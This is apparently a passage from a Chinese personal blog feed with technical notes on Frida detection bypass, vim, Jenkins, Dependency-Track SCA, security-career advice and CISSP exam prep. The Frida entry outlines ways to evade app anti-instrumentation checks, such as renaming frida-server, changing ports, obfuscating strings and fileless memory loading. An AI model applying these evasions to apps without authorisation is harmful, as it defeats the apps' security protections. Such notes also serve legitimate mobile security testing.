jailbreak （Frida 通常需要权限）</li></ul><h3 id="检测端口或网络通信"><a href="#检测端口或网络通信" class="headerlink" title="检测端口或网络通信"></a>检测端口或网络通信</h3><ul><li>检查是否有连接到 Frida 默认端口的流量</li></ul><h3 id="检测行为异常"><a href="#检测行为异常" class="headerlink" title="检测行为异常"></a>检测行为异常</h3><ul><li>检查函数调用是否被 Hook （例如通过检查函数地址或堆栈）</li><li>检查 javascript 引擎的痕迹（例如 V8 引擎）</li></ul><h3 id="环境检查"><a href="#环境检查" class="headerlink" title="环境检查"></a>环境检查</h3><ul><li>检查是否运行在模拟器或调试环境中（Frida 常与此类环境搭配使用）</li></ul><h2 id="Frida-检测绕过技术"><a href="#Frida-检测绕过技术" class="headerlink" title="Frida 检测绕过技术"></a>Frida 检测绕过技术</h2><h3 id="隐藏-Frida-server"><a href="#隐藏-Frida-server" class="headerlink" title="隐藏 Frida-server"></a>隐藏 Frida-server</h3><ul><li>重命名进程<ul><li>修改 frida-server 文件名，避免被简单进程名检测</li><li>例如：在设备上执行 <code>mv /data/local/tmp/frida-server /data/local/tmp/fakeprocess</code></li></ul></li><li>修改默认端口<ul><li>编译自定义版本的 Frida ，改变默认的 27042 端口</li><li>使用命令： frida-server -l 0.0.0.0:12345 指定新端口</li></ul></li><li>隐藏网络通信<ul><li>使用本地 Unix 套接字代替 TCP 通信，减少网络痕迹</li></ul></li></ul><h3 id="绕过内存检测"><a href="#绕过内存检测" class="headerlink" title="绕过内存检测"></a>绕过内存检测</h3><ul><li><p>动态加载 Frida</p><ul><li>使用 Frida 的 Gadget 模式（libfrida-gadget.so），将其注入应用启动时，而不是依赖外部 frida-server</li><li>修改 Gadget 的配置文件，避免加载时暴露</li></ul></li><li><p>字符串混淆</p><ul><li>修改 Frida 源码，混淆关键字符串，例如：frida、gadget，然后重新编译</li><li>示例：将 libfrida-gadget.so 重命名为 libcustom.so，并移除可识别符号</li></ul></li><li><p>内存隐藏</p><ul><li>使用工具，如 ptrace 或自定义加载器，在注入后擦除 Frida 的内存痕迹</li></ul></li></ul><h3 id="绕过文件系统检测"><a href="#绕过文件系统检测" class="headerlink" title="绕过文件系统检测"></a>绕过文件系统检测</h3><ul><li>更改路径<ul><li>将 frida-server 放在非常规路径 （如  &#x2F;data&#x2F;data&#x2F;com.example.app&#x2F;），并限制文件权限</li></ul></li><li>无文件注入<ul><li>使用 memfd_create 或其他内存加载技术，直接将 Frida 加载到内存中，避免文件落地</li></ul></li></ul><h3 id="绕过行为检测"><a href="#绕过行为检测" class="headerlink" title="绕过行为检测"></a>绕过行为检测</h3><ul><li>延迟注入<ul><li>在应用启动后再注入 Frida，避免初始化的检测逻辑</li><li>示例：使用脚本等待特定条件，如某个类加载，再执行注入</li></ul></li><li></li></ul><h1 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h1>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mobilesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mobilesec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim_base</title>
    <link href="/2025/01/15/yunwei/applications/vim_base/"/>
    <url>/2025/01/15/yunwei/applications/vim_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><h2 id="回到行首0"><a href="#回到行首0" class="headerlink" title="回到行首0"></a>回到行首0</h2><p>普通模式下，按esc回到普通模式</p><p>按下 <code>0</code> 键，光标会移到当前行的第一个字符，无论该字符是否为空</p><h3 id="回到行首第一个非空字字符"><a href="#回到行首第一个非空字字符" class="headerlink" title="回到行首第一个非空字字符^"></a>回到行首第一个非空字字符^</h3><p>普通模式下，按esc回到普通模式</p><p>按下 <code>^</code> 键，光标会跳过行首的空白字符，移到第一个非空字符处</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jenkins_base</title>
    <link href="/2025/01/14/yunwei/applications/jenkins/jenkins_base/"/>
    <url>/2025/01/14/yunwei/applications/jenkins/jenkins_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="docker-部署"><a href="#docker-部署" class="headerlink" title="docker 部署"></a>docker 部署</h2><h3 id="下载最新镜像"><a href="#下载最新镜像" class="headerlink" title="下载最新镜像"></a>下载最新镜像</h3><p>docker pull jenkins&#x2F;jenkins</p><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>docker run -d -p 8080:8080 -p 50000:50000 –name jenkins –restart&#x3D;on-failure jenkins&#x2F;jenkins</p><h3 id="查看默认密码"><a href="#查看默认密码" class="headerlink" title="查看默认密码"></a>查看默认密码</h3><p>docker exec -it jenkins cat &#x2F;var&#x2F;jenkins_home&#x2F;secrets&#x2F;initialAdminPassword</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>jenkins</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>devsecops_sca</title>
    <link href="/2025/01/13/security/codesec/devsecops_sca/"/>
    <url>/2025/01/13/security/codesec/devsecops_sca/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SCA概念"><a href="#SCA概念" class="headerlink" title="SCA概念"></a>SCA概念</h1><p>Software Composition Analysis <strong>软件成分分析</strong></p><h1 id="SCA原理"><a href="#SCA原理" class="headerlink" title="SCA原理"></a>SCA原理</h1><p><strong>分析源码提取项目依赖的第三方组件及其版本、许可证</strong>等信息，生成软件物料清单（SBOM，Software Bill-of-Materials），根据SBOM分析项目是否使用了存在已知漏洞的组件，后期其它组件爆出漏洞时也可根据SBOM快速排查受影响项目。</p><h1 id="SCA供应链风险"><a href="#SCA供应链风险" class="headerlink" title="SCA供应链风险"></a>SCA供应链风险</h1><h2 id="风险与挑战"><a href="#风险与挑战" class="headerlink" title="风险与挑战"></a>风险与挑战</h2><p><img src="/image-20250227140806385.png" alt="image-20250227140806385"></p><p><img src="/image-20250227141106532.png" alt="image-20250227141106532"></p><p><img src="/image-20250227141241117.png" alt="image-20250227141241117"></p><p><img src="/image-20250227141659095.png" alt="image-20250227141659095"></p><p><img src="/image-20250227141822011.png" alt="image-20250227141822011"></p><p><img src="/image-20250227141931821.png" alt="image-20250227141931821"></p><p>二方包：内部开发的组件</p><p>检测能力外放，提供给测试人员使用</p><p>漏洞可达性-提升漏洞检测准确性</p><p><img src="/image-20250227142534854.png" alt="image-20250227142534854"></p><p><img src="/image-20250227142744052.png" alt="image-20250227142744052"></p><p><img src="/image-20250227143232537.png" alt="image-20250227143232537"></p><p><img src="/image-20250227143306433.png" alt="image-20250227143306433"></p><h1 id="开源工具"><a href="#开源工具" class="headerlink" title="开源工具"></a>开源工具</h1><h2 id="DependencyCheck"><a href="#DependencyCheck" class="headerlink" title="DependencyCheck"></a>DependencyCheck</h2><h2 id="DependencyTrack"><a href="#DependencyTrack" class="headerlink" title="DependencyTrack"></a>DependencyTrack</h2><h3 id="DependencyTrack简介"><a href="#DependencyTrack简介" class="headerlink" title="DependencyTrack简介"></a>DependencyTrack简介</h3><p>Dependency-Track 是一个智能组件分析平台，使组织能够识别和降低软件供应链中的风险。</p><p>支持多个情报源，包括国家漏洞数据库 （NVD）、Sonatype OSS 索引、GitHub Advisories、Snyk、OSV 和来自基于风险的安全的 VulnDB，发现易受攻击的组件</p><h3 id="DependencyTrack原理"><a href="#DependencyTrack原理" class="headerlink" title="DependencyTrack原理"></a>DependencyTrack原理</h3><p>获取SBOM</p><p><img src="/image-20250113190710639.png" alt="image-20250113190710639"></p><h3 id="DependencyTrack部署"><a href="#DependencyTrack部署" class="headerlink" title="DependencyTrack部署"></a>DependencyTrack部署</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -LO https://dependencytrack.org/docker-compose.yml<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h4 id="默认端口8080"><a href="#默认端口8080" class="headerlink" title="默认端口8080"></a>默认端口8080</h4><h4 id="默认账号密码"><a href="#默认账号密码" class="headerlink" title="默认账号密码"></a>默认账号密码</h4><p>admin&#x2F;admin</p><p>初次部署，会后台下载 相关 漏洞库</p><h4 id="error-部署后登录不成功"><a href="#error-部署后登录不成功" class="headerlink" title="error-部署后登录不成功"></a>error-部署后登录不成功</h4><p><strong>现象</strong></p><p>使用默认密码登录后，不会跳转，存在如下请求</p><p><img src="/image-20250115090958288.png" alt="image-20250115090958288"></p><p><strong>解决方案</strong></p><p>修改 docker-compose 文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">- <span class="hljs-attribute">API_BASE_URL</span>=http://localhost:8081<br></code></pre></td></tr></table></figure><p>localhost 修改为本机地址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">- <span class="hljs-attribute">API_BASE_URL</span>=http://10.217.11.149:8081<br></code></pre></td></tr></table></figure><p><a href="https://owasp.org/www-project-dependency-track/">https://owasp.org/www-project-dependency-track/</a></p><h1 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h1><p>【1】基于开源工具实现软件成分分析SCA <a href="https://xz.aliyun.com/u/44309"><strong>myc</strong></a> &#x2F; 2022-07-05 </p><p><a href="https://xz.aliyun.com/t/11492?time__1311=Cq0xRDnD070QKGNPeeuAxjOGrSFkLbD">https://xz.aliyun.com/t/11492?time__1311=Cq0xRDnD070QKGNPeeuAxjOGrSFkLbD</a></p><p>【2】基于DependencyTrack实现第三方组件管理 该用户已注销-0189 2021-09-04 12:08:17</p><p><a href="https://www.freebuf.com/articles/network/287486.html">https://www.freebuf.com/articles/network/287486.html</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>codesec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>codesec</tag>
      
      <tag>devsecops</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tk_wb_blog_study</title>
    <link href="/2025/01/12/informationCocoon/tk_wb_blog_study/"/>
    <url>/2025/01/12/informationCocoon/tk_wb_blog_study/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2020-8-16-工作并不意味着学习的结束，而是另一个开始"><a href="#2020-8-16-工作并不意味着学习的结束，而是另一个开始" class="headerlink" title="2020-8-16-工作并不意味着学习的结束，而是另一个开始"></a>2020-8-16-工作并不意味着学习的结束，而是另一个开始</h2><p><strong>工作并不意味着学习的结束，而是另一个开始。我们大多数人至少都要工作三十年，这三十年里还会有很多东西要学。所以不用太在意之前学了什么，更重要的是看你还能学会什么。无论之前学过什么，将来都要再学新东西。无论之前学的是什么，将来也都会有用。艺无止境，功不唐捐。</strong></p><p>【一个女生怎样才能进入腾讯的玄武实验室？】<br>『本人是一位热爱网络安全技术的女生，大二开始接触网络安全，因为热爱，大部分时间都在自学网络安全方面的知识技能，有学习主动信息收集，被动信息收集，无线攻击，密码破解，web渗透,metasploit,linux等渗透测试所需技能，正学习python。不断地学习中发现，可能因为网络安全涉及面较广，所以需要掌握的知识较多但不深，而心中有大牛的目标，向往玄武这种顶级的国内安全研究实验室，查看各种资料发现玄武对技术的要求非常专一且深入，再加上玄武好像只有一位女生，有些迷茫不知朝哪个方向努力，才能离玄武更近一步。』</p><p>很多人以为我是专门研究二进制安全的，所以偏向二进制方向。其实去年发现的 BadTunnel 就不属于二进制方向：《BadTunnel：跨网段劫持广播协议》<a href="https://weibo.cn/sinaurl?u=http://mp.weixin.qq.com/s?__biz=MzA5NDYyNDI0MA==&mid=2651953600&idx=1&sn=7779613d4886c7739a9bbf076b7195f9&scene=0"><img src="https://h5.sinaimg.cn/upload/2015/09/25/3/timeline_card_small_web_default.png" alt="img">BadTunnel：跨网段劫持广播协议</a>。你上面提到的东西，我基本也都搞过。</p><p>这是很早以前一份简历里的内容：</p><p>• 2002年1月，发现了CheckPoint MetaInfo Sendmail管理接口执行命令漏洞。<br>• 2002年1月，发现了Snitz Forums 2000 Version 3.1 SR4的管理界面认证绕过漏洞。<br>• 2002年4月，和一个朋友共同发现了PhpBB等多个论坛程序的BBCode函数拒绝服务漏洞（bugtraq ID 4432、4434）</p><p>前几年研究浏览器的二进制漏洞时也同时研究过 Web 前端相关的问题：《浏览器和本地域》<a href="https://weibo.cn/sinaurl?u=http://hitcon.org/2013/download/%5BI1%5D%20Tombkeeper%20-%20%E7%80%8F%E8%A6%BD%E5%99%A8%E5%92%8C%E6%9C%AC%E5%9C%B0%E5%9F%9F_HITCon2013.pdf"><img src="/timeline_card_small_web_default.png" alt="img">网页链接</a></p><p>你说的无线攻击我也研究过：《来自空中的威胁》<a href="https://weibo.cn/sinaurl?u=http://www.cert.org.cn/upload/cncertcc06/0330/ct1/5.060330-YuYang-ThreatsFromAir.pdf"><img src="/timeline_card_small_web_default.png" alt="img">网页链接</a></p><p>渗透测试做的就更多了。以前在乙方公司，我是渗透测试主力。还记得最忙的一个项目，我和部门领导一起，两个月做了 184 台服务器的渗透测试。</p><p>所以我可能是最不会对各类安全技术有偏见的人。</p><p>无论哪类技术，背后的需要的东西都是类似的。AFL 这个革命性的二进制漏洞 Fuzz 工具的作者，也是《The Tangled Web: A Guide to Securing Modern Web Applications》这本 Web 安全圣经的作者。</p><p>我们实验室有几个做 Windows 方向的同学， 毕业前都没接触过 Windows 安全。但在实验室工作半年后，就开始能做出一些成果。一年多之后，就已经能做出很不错的东西。当然，这并不意味着干这行很容易，人人可为。这几位同学虽然之前没接触过 Windows 安全，但在校期间，在其它方向上都做出了一些东西。我记得其中一个同学，毕业前硬啃了几个月 Apache 源码，发现了一个漏洞。在 Apache 里还能搞出东西来，是不容易的。</p><p>工作并不意味着学习的结束，而是另一个开始。我们大多数人至少都要工作三十年，这三十年里还会有很多东西要学。所以不用太在意之前学了什么，更重要的是看你还能学会什么。无论之前学过什么，将来都要再学新东西。无论之前学的是什么，将来也都会有用。艺无止境，功不唐捐。</p><p><img src="/image-20250112222253303.png" alt="image-20250112222253303"></p><p><img src="/image-20250112222312035.png" alt="image-20250112222312035"></p><p><a href="https://weibo.com/1401527553/Jg8YtA5j2">https://weibo.com/1401527553/Jg8YtA5j2</a></p><h2 id="2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进"><a href="#2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进" class="headerlink" title="2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进"></a>2020-12-9-如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进</h2><p>我刚参加工作的时候，做了很长一段时间“低级”“无意义”的工作。就是给 IDS 加一些针对古老攻击工具的规则。</p><p>那些木马和漏洞有些甚至古老到连运行环境都不好找了。所以加那些规则对检测能力来说确实没有意义，永远都不会发挥作用。但竞争对手有这个规则你就也得有。你看，其实连网络安全产品也是“内卷”的。</p><p>工作的步骤就是搜索、下载、运行、抓包、看特征、写规则。然后再重复，再重复，重复很多遍。有时候为了应付一个投标前的测评，每天要加接近一百条规则。就这么重复，干到十一二点。</p><p>但通过做这些重复的、“低级”的、“无意义”的工作，我熟悉了各类漏洞的原理，学会了很多分析工具的使用，熟悉了大量通用的和私有的网络协议，看到了各种系统可能出问题的地方。如果 2002 年没有做过这些“低级”“无意义”的工作，我大概也不会对网络协议有那么深刻的理解，不会在 2016 年发现 BadTunnel 漏洞。</p><p>当然，如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进。对这类人来说，工作确实只是消耗过程，而不能成为增益过程。</p><p><img src="/image-20250112222038445.png" alt="image-20250112222038445"></p><p><a href="https://weibo.com/1401527553/JxH3KzkYg">https://weibo.com/1401527553/JxH3KzkYg</a></p><h2 id="2023-10-29-零基础变成一基础，再变成二基础，再变成三基础"><a href="#2023-10-29-零基础变成一基础，再变成二基础，再变成三基础" class="headerlink" title="2023-10-29-零基础变成一基础，再变成二基础，再变成三基础"></a>2023-10-29-零基础变成一基础，再变成二基础，再变成三基础</h2><p>大约十年前，我回答过一个“零基础如何学习挖漏洞”的问题。我说我是先从看漏洞公告开始，入门阶段至少看了两三千条历史漏洞。还要看漏洞分析文档，在看的过程中学习调试和汇编。</p><p>在我当年的那条回答下面，时任 360 技术总裁的谭晓生说他当年自学技术是从逆向研究老的 DOS 病毒开始，还逆向了 WPS，并自己模仿写了一个；后来创办了微步在线的薛峰评论说他当年也是从看漏洞公告开始，翻遍了漏洞库里所有的老漏洞。</p><p>“零基础如何学XXX”这类问题很常见，答案都是一样的：先把零基础变成一基础，再变成二基础，再变成三基础。谁不是从零基础开始的呢？强调“零基础”，潜台词就是不愿付出入门的功夫，希望有神奇的办法能跳过打基础的阶段。这种事情在武侠小说里有，在现实中是没有的。</p><p><img src="/image-20250112213555282.png" alt="image-20250112213555282"></p><p><a href="https://weibo.com/1401527553/Nq7WAtobo">https://weibo.com/1401527553/Nq7WAtobo</a></p><h2 id="24-3-15-只要稍微努力一点，只要开始行动，别停下"><a href="#24-3-15-只要稍微努力一点，只要开始行动，别停下" class="headerlink" title="24-3-15-只要稍微努力一点，只要开始行动，别停下"></a>24-3-15-只要稍微努力一点，只要开始行动，别停下</h2><p>昨天那个学外语的 APP 告诉我：我的学习经验值超过了大部分使用这个 APP 的人——但我其实没学多久。</p><p>所以我一直告诉大家：你只要稍微努力一点，只要开始行动，别停下，无论快慢，就会比大部分人都强了。 </p><p><img src="/image-20250112213226026.png" alt="image-20250112213226026"></p><p><a href="https://weibo.com/6827625527/O56cxi36M">https://weibo.com/6827625527/O56cxi36M</a></p><h2 id="2022-1-18-文档学习法"><a href="#2022-1-18-文档学习法" class="headerlink" title="2022-1-18-文档学习法"></a>2022-1-18-文档学习法</h2><p>一、先把Windows的帮助文件从头到尾看一遍。</p><p>二、在Windows目录下搜索*.txt、*.htm?、*.log、*.ini，把每一个文件内容都看一遍。</p><p>三、把注册表浏览一遍。</p><p>不少人听说我曾靠“看帮助文件”学技术，于是也跑去看。结果发现自己看不下去，又来问我这是怎么回事。</p><p>下面这篇是所谓“看帮助文件”那个说法的出处。完整看一下就明白了——我当时说的恰恰就是大部分人都看不下去。看不下去没关系，可以找点别的事情做。</p><p>写于2005年10月2日</p><p>2005.10.02</p><p>这两天论坛上又有人开始抱怨世风日下，大家都现实了，都不开放了，不交流了。对这种“月经贴”，我基本上已经习惯了，不过因为吃了粉皮炖鸡，心情比较好，于是就说了两句。</p><p>三四年前，当时我对人性的看法还不像现在这样。有几个人加了我的QQ，说想学Windows，我居然就好为人师起来，自不量力地教人学Windows。我很天真地把自己的经验告诉他们：</p><p>一、先把Windows的帮助文件从头到尾看一遍。</p><p>二、在Windows目录下搜索*.txt、*.htm?、*.log、*.ini，把每一个文件内容都看一遍。</p><p>三、把注册表浏览一遍。</p><p>没有诀窍，也不用花钱买书。任何人把这三步做完之后，只要不是傻子，在Windows应用方面都可以非常熟练。并且如果想进一步学，也自然知道应该去看什么了。</p><p>结果甚至没有一个人能看完Windows帮助文件，看完三分之一的都没有，都说看不下去。我很奇怪，我看Windows的帮助文件就像看金庸小说一样愉快，怎么会有人觉得辛苦？</p><p>后来我想明白了：因为我爱她，而他们不爱她，只是想占有她而已。</p><p>他们要的不是交流，不是开放，甚至也不是想找个人“拜师”，他们想要的不是郭靖遇到的洪七公，而是虚竹遇到的无涯子。</p><p>再后来，一个偶然的机会，我看到了小四同学写的那篇《你尽力了么？》，才知道原来这不只是我一个人的看法。</p><p>这两天在家，在笔记本上折腾Linux，遇到了很多问题，我就把内核每一个编译选项的说明都细细看了一遍，反复编译上二十多遍——然后，所有问题的答案都找到了。显然，学Linux和学Windows的方法并没有什么不同。</p><p><a href="https://weibo.com/1401527553/LbklKyE0j">https://weibo.com/1401527553/LbklKyE0j</a></p><h2 id="2024-4-24-学会做事"><a href="#2024-4-24-学会做事" class="headerlink" title="2024-4-24-学会做事"></a>2024-4-24-学会做事</h2><p>中国每年大概有五百万理工科毕业生。其中堪称优秀技术人才的自然是少数。然而，技术好又会做事的更是极少数。</p><p>什么是“做事”？就是确立目标、分析路径、规划资源、制定方案、迭代执行。优秀技术人才，自然是能把技术做好的人。但从做技术到做事，中间还有很远的距离。大部分人可能终其一生都不会做事。</p><p>前阵子一个同学跟我说想去 BlackHat 演讲。我说你是怎么规划这件事的？他一愣，半天说不出话。他定了目标，但没去想后面的事情。</p><p>然后我问他有没有注意到 BlackHat 有些演讲水平很高，但也有一些不太行的。他说确实是这样。然后我说你有没有分析过为什么会这样？他说没有。我说如果你分析一下那些不太行的演讲为什么也能上 BlackHat，是不是会对你达成目标有帮助？他恍然大悟。</p><p>我说这只是一个小点，还不算完。你知道怎么才能上 BlackHat？他想了一下说是投稿被接受。我说那么是不是应该收集既往演讲的内容摘要，分析被接受的投稿有什么特点。</p><p>然后我说你有没有想过 Blackhat 演讲者和主办方之间是什么关系？他说不知道。我说本质是商业合作关系。主办方给演讲者提供曝光机会和机票酒店，演讲者用自己的内容帮主办方把票卖出去。所以投稿要让别人看了觉得是有利于卖票的。</p><p>我又问你有没有想过 Review Board 里的人是怎么挑选演讲的？有没有想过如果你在  Review Board 你会看重哪些？有没有了解过 Review Board 里的那些人？其中和你技术方向相关的人有哪些？这些人历史上做过什么？他们可能会对哪些东西更青睐？</p><p>说了这么多，还只是分析路径这一步。后面规划资源、制定方案、迭代执行都还需要更多的思考。当然，这个同学刚毕业，不会做事很正常，后面还有时间慢慢学。但如果你毕业已经很久了，发现自己还不会做事，就要开始留心培养这方面的能力了。在学校里我们的成长主要靠学习知识。毕业后，更重要的成长是学会做事。</p><p><a href="https://weibo.com/6827625527/ObcUX0JMY">https://weibo.com/6827625527/ObcUX0JMY</a></p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
      <tag>成长建议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/01/07/informationCocoon/tk_group_message/2025/"/>
    <url>/2025/01/07/informationCocoon/tk_group_message/2025/</url>
    
    <content type="html"><![CDATA[<p>有效努力是做对的事的范畴，高效能努力是怎么把事做对的范畴，先有效再高效</p><p><img src="/2025/image-20250107190307395.png" alt="image-20250107190307395"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>cissp-sc2</title>
    <link href="/2025/01/04/security/seccert/cissp/cissp-sc2/"/>
    <url>/2025/01/04/security/seccert/cissp/cissp-sc2/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="SC2-政策"><a href="#SC2-政策" class="headerlink" title="SC2 政策"></a>SC2 政策</h2><h3 id="准考规定"><a href="#准考规定" class="headerlink" title="准考规定"></a>准考规定</h3><p>计划在考试开始时间前至少 <strong>30 分钟</strong>到达您的考试中心。要办理预约登记手续，<strong>需要</strong>满足以下条件：出示<strong>两 （2） 份</strong>有效且未过期的个人身份证件（示例包括：政府签发的身份证件、护照等）。两者都必须有您的姓名（与考试报名中显示的姓名完全一致）和签名，其中之一必须有您的照片。有关可接受 ID 的更多信息，请访问：<a href="https://www.isc2.org/Exams/Exam-Day%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8">https://www.isc2.org/Exams/Exam-Day，然后在</a> What You Need to Bring to the Test Center 选项卡下了解更多信息。<br><strong>不可接受的身份证件形式：</strong> <strong>数字身份证</strong>（数字身份证是个人身份信息的电子表示形式，可用于验证个人身份）有关 Aadhaar ID 的更多信息，请访问<a href="https://www.pearsonvue.com/content/dam/VUE/vue/global/documents/global-id-policy/Pearson-VUE-Aadhaar-ID-Policy-English.pdf">Pearson VUE 的 Aadhaar ID 政策</a>.18 岁以下的未成年人 – 未成年人必须在考试当天由父母或监护人陪同。请参阅未成年人的身份证件要求，<a href="https://www.isc2.org/exams/exam-day">https://www.isc2.org/exams/exam-day</a> 提供您的签名。提交到<a href="https://www.isc2.org/-/media/ISC2/Documents/palm-vein_candidate-isc2.ashx?la=en&hash=A575A664E77B78B6BB2708413EFB6C7913645C08">手掌静脉扫描</a>（除非法律明确禁止）。拍下你的照片。照片中不得佩戴帽子、围巾和外套。此外，您不得在考场内佩戴这些物品。请将您的个人物品留在考场外。您将可以访问安全存储。由于存储空间有限，请适当规划。Pearson VUE 考试中心不对您的个人物品负责。接收来自测试管理员 （TA） 的简短介绍。入职培训结束后，TA 将护送您前往检测站。签署并同意<a href="https://www.isc2.org/Exams/Non-Disclosure-Agreement">保密协议</a>这将在您的考试开始时提供。请花点时间立即查看协议，以便您在参加考试时熟悉它。如果考试主办方选择，您同意 Pearson VUE 将在考试当天在考试中心收集您的手掌静脉模式，并在法律允许的范围内保留该信息。您的手掌静脉扫描将用于考试当天和未来考试日的身份验证，检测和防止任何欺诈行为，并维护考试计划的安全性和完整性。有关 Pearson VUE 个人数据（包括手掌静脉扫描等生物识别数据）使用和保留政策的更多信息，请参阅我们的<a href="https://wsr.pearsonvue.com/privacy">隐私和 Cookie 政策</a>.您同意这些测试政策包括同意隐私和 Cookie 政策。</p><h3 id="考试改期规定"><a href="#考试改期规定" class="headerlink" title="考试改期规定"></a>考试改期规定</h3><p>如果您想重新安排考试预约，您必须联系<a href="https://home.pearsonvue.com/contact">皮尔逊 VUE</a>.如果您选择<strong>在线重新安排</strong>预约，您必须<strong>至少在预约前 48 小时</strong>进行。如果您选择<strong>致电 Pearson 客户支持团队重新安排</strong>时间，则必须至少<strong>在预约前 24 小时</strong>这样做。重新安排考试预约需要支付 50 美元的费用。如上所述，在没有适当提前通知的情况下重新安排考试预约将导致缺席并没收所有考试和重新安排费用。安排后，您最多有 365 天的时间参加考试。未能在 365 天内参加考试将导致缺席并没收所有考试和重新安排费用。</p><h3 id="考试取消规定"><a href="#考试取消规定" class="headerlink" title="考试取消规定"></a>考试取消规定</h3><p>如果您想取消考试预约，您必须联系<a href="https://home.pearsonvue.com/contact">皮尔逊 VUE</a>.如果您选择<strong>在线取消</strong>预约，您必须<strong>至少在预约前 48 小时</strong>进行。如果您选择<strong>致电 Pearson 客户支持团队取消</strong>，则必须至少<strong>在预约前 24 小时</strong>进行取消。取消考试预约需要支付 100 USD 的费用。如上所述，在没有适当提前通知的情况下取消考试预约将导致缺席并没收所有考试和重新安排费用。</p><h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p><strong>ISC2 条款和条件</strong>ISC2 要求所有认证考生阅读并接受此处规定的条款和条件：<a href="https://www.isc2.org/uploadedFiles/Certification_Programs/CBT-Examination-Agreement.pdf">https://www.isc2.org/uploadedFiles/Certification_Programs&#x2F;CBT-Examination-Agreement.pdf。</a>不同意条款和条件的考生将不被允许参加任何 ISC2 考试。<strong>保密协议 （NDA）</strong>未能在规定的 5 分钟内阅读或接受 ISC2 NDA 协议将导致考试终止并丧失考试预约。没收考试预约也包括没收所有考试费用。要在以后参加考试，您将需要重新报名参加考试并支付所有适用的注册费。<strong>有关 ISC2 考试的重要信息</strong>通过机考参加考试的考生的好处之一是，大多数考生在完成考试后立即收到分数。在某些情况下，ISC2 必须在发布考试结果之前进行定期心理测量分析。对于受此流程影响的少数考生，预计考生将在考试后 6 -8 周内收到成绩。ISC2 提供两种类型的基于计算机的考试——线性和自适应——但是这两种考试类型都不允许考生跳过一个项目，也不能在管理期间稍后返回项目。答案一旦确认，就无法更改、审查或重新访问。常见问题（FAQ）和常见查询的解答可在此处找到：<a href="https://www.isc2.org/Frequently-Asked-Questions">https://www.isc2.org/Frequently-Asked-Questions</a>.**<br>住宿政策**ISC2 为有考试便利记录的人提供合理和适当的便利。在安排考试之前，必须由 ISC2 申请并批准住宿。如果您想申请住宿，请访问<a href="https://www.isc2.org/Register-for-Exam%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8">https://www.isc2.org/Register-for-Exam，然后在</a> Requesting Special Accommodation（申请特殊便利）选项卡下查看有关如何申请便利的信息和说明。考试便利设施是个性化的，并根据具体情况进行考虑。住宿获得批准后，ISC2 将通知 Pearson VUE 住宿团队。请等待 Pearson VUE 最多三个工作日接收此信息。然后，联系 Pearson VUE，以便您预约考试，联系信息可在<a href="http://www.pearsonvue.com/isc2/contact">www.pearsonvue.com/isc2/contact</a>.便利设施并不能保证成绩提高或考试完成。安排初次考试预约后，可能需要支付 50 美元的费用才能在获得批准的便利设施下重新安排考试。</p><p>C✅</p><p>D✅</p><p>B✅</p><p>B✅</p><p>A✅</p><p>D✅</p><p>B❌ D</p><p>​VPN 链接可以在任何网络通信连接上建立。</p><p>C✅</p><p>D✅</p><p>B✅</p><p>C✅</p><p>B✅</p><p>​？</p><p>B❌ C</p><p>​SW-CMM</p><p>A❌ B</p><p>​环保护方案设计</p><p>​第 1 层和第 2 层含设备驱动，但通常不实际执行，因为他们经常被折叠到第 0 层。</p><p>​第 0 层始终含安全内核。</p><p>B✅</p><p>B✅</p><p>C❌ A</p><p>​XOR 函数</p><p>ADEFJ❌ ACEDIJ</p><p>​标准数据类型分类</p><p>​公共、个人、敏感、专有、关键和机密</p><p>A❌ 